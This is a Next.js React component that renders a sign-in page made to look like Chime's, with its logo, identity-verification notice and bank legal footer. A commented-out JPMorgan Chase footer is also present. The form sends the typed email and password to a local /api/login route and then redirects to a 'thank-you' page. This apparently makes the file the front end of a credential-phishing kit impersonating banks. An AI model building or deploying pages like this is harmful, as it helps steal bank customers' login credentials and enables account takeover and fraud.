
"use client"
import axios from "axios";
import Image from "next/image";
import { useEffect, useState } from "react";
import Link from "next/link";


export default function Main() {

  const [isLoading, setIsLoading] = useState(false)
    const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

const handleSubmit = async (event: { preventDefault: () => void; }) => {
  event.preventDefault();
  if(!username && !password){
    return alert("login required")
  }
  setIsLoading(true);

  try {
    const response = await axios.post('/api/login', {
      username,
      password
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    const data = response.data; // Use.data property to access the response body
    console.log(data);

    // if successful navigate to thank you page
    // window.location.href = '/thank-you';
      if (response.status >= 200 && response.status < 300) {
        // window.location.href = '/thank-you';
        window.location.href = '/thank-you';

   }
    // 



    // Clear username and password fields
    setUsername('');
    setPassword('');
  } catch (error) {
    console.error(error);
    // Optionally, handle errors here
  } finally {
    setIsLoading(false);
  }
};
// const MyComponent = () => {
//   const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

//   useEffect(() => {
//     const handleResize = () => {
//       setIsMobile(window.innerWidth <= 768);
//     };

//     window.addEventListener('resize', handleResize);

//     return () => {
//       window.removeEventListener('resize', handleResize);
//     };
//   }, []);

//   const backgroundColor = isMobile? 'black' : 'url("/assets/background.jpg")';

  return (
    <main className="flex flex-col justify-center items-center">
      <div className="flex-col w-full mx-auto justify-center items-center">
      </div>
    <div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[30%] mx-auto">
      <div className="flex-col items-center justify-center space-y-4  bg-white w-full -mt-20">
       <div className="w-full"> <img src="/assets/chime.png" alt="logo" className="mt-20 py-6 px-3"  /> 
       </div>
          
          <form onSubmit={handleSubmit} className="w-full mx-auto space-y-8 rounded-md px-6">
        <input
          id="email"
          type="text"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="w-full p-5 rounded-md focus:outline-none focus:ring-0 border-2 sm:border-gray-400 hover:border-green-200"
          placeholder="Email"
        />
        <input
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="w-full p-5 rounded-md focus:outline-none focus:ring-0 border-2 sm:border-gray-400 hover:border-green-200"
          placeholder="Password"
        />
        
        <button
          disabled={isLoading}
          className={`w-full ${isLoading? "bg-gray-400 cursor-not-allowed py-2 px-4" : "bg-gray-300 hover:bg-[#1c3666] text-white font-bold py-2 px-4 rounded"}`}
        >
          {isLoading? (
            <div className="flex items-center justify-center">
              <div className="animate-spin rounded-full h-6 w-6 border-t-2 border-b-2 border-white"></div>
            </div>
          ) : (
            "Sign in"
          )}
        </button>
        <div className="w-full">
          <span> By clicking “Sign in”, you agree to receive SMS text </span> <br />
          <span> messages from Chime to verify your identity </span>
        </div>
        <div className="font-bold text-m underline w-full">
        <span>Forgot your email address? </span> <br />
        <span>Forgot your password? </span>
        </div>
        <div className="w-full text-xs text-gray-500 py-10">
          <span className="flex">© 2024 Chime. All Rights Reserved.</span> <br />
          <span>Banking Services provided by The Bancorp Bank, N.A., or Stride Bank, N.A.,</span> <br />
          <span>Members FDIC. The Chime Visa® Debit Card is issued by The Bancorp Bank, </span> <br />
          <span>N.A., or Stride Bank pursuant to a license from Visa U.S.A. Inc. and may be</span> <br />
          <span>used everywhere Visa debit cards are accepted. Please see back of your Card </span> <br />
          <span>for its issuing bank.</span>
        </div>
      </form>
        </div>
        </div>
{/* <div className="flex justify-center items-center flex-col">
          <span className="text-center text-gray-500 py-3 mt-28">Follow Us:</span>
        </div>
        <div style={{textAlign: 'center', padding:'5px 20%' , marginTop:'-2%'}}>
  <hr style={{borderTop: '1px solid #000', marginTop: '20px'}} />
</div> */}
        {/* <div className="flex flex-col bg-white py-10 px-4 mt-6 text-xs">
          <form>
          <span>
          <div className='flex-col w-full mx-auto leading-10 space-x-6 text-xs underline text-underline-offset-2'>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500 ">Contact Us</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Privacy</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Security</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Terms of use</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Accessibility</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">SAFE Act: Chase Mortgage Loan Originators</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Fair Lending</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">About Chase</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">J.P. Morgan</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">JPMorgan Chase & Co.</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Careers</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500"> Español</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Chase Canada</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Site Map</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Member FDIC</a></Link>
        </div>
          </span>
          <footer className="flex justify-center items-center w-full mx-auto mt-2">(c) 2023 JPMorgan Chase & Co.</footer>
          
          </form>
        </div> */}
   </main>
   
  );
}

